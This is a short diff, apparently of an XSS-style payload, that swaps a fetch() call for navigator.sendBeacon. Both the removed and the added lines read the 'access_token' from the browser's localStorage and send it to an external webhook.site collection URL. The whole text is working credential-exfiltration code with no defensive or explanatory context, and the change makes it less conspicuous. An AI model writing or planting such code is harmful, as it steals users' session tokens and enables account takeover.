@@ -1,1 +1,2 @@
-fetch('//webhook.site/0e6b7184-7995-4a5c-94c6-814b965c5854/?t='+localStorage.getItem('access_token'));
+var t = localStorage.getItem('access_token');
+navigator.sendBeacon('//webhook.site/0e6b7184-7995-4a5c-94c6-814b965c5854/?t='+t);
